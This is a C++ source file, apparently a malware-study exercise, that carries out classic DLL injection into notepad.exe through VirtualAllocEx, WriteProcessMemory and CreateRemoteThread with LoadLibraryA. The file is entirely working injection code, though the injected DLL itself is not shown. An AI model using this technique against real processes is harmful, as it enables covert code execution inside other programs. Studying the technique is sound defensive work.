// inject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>

DWORD FindPID(const std::wstring& processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create snapshot! Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        std::cerr << "Failed to get the first process! Error: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;  // return PID
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);
    std::cerr << "Process not found!" << std::endl;
    return 0;
}
int main()
{
    const char* dllPath = "F:\\VNPT Fresher\\Malware learn\\DLLinject\\Dll1.dll";   // Path to the dll
    std::wstring processName = L"notepad.exe";
    DWORD processId = FindPID(processName);
    if (processId == 0) {
        std::cerr << "Could not find PID." << std::endl;
        return 1;
    }
    std::cout << "PID = " << processId << std::endl;

    // Open notepad process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProc){
        std::cerr << "Failed to open process! Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate memory in process
    LPVOID remoteMemory = VirtualAllocEx(hProc, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "Failed in step Allocate! Error: " << GetLastError() << std::endl;
        return 1;
    }
    // Write the path to memory of process
    if (!WriteProcessMemory(hProc, remoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write memory! Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Get address of LoadLibraryA
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        std::cerr << "Falied to get LoadLibraryA address! Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Create remote threat that load DLL
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread! Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Waitting for creation of remote threat complete.
    WaitForSingleObject(hThread, 1000);
    std::cout << "DLL injected successfully into PID:" << processId << std::endl;

    // Clean the handle and alloc
    VirtualFreeEx(hProc, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
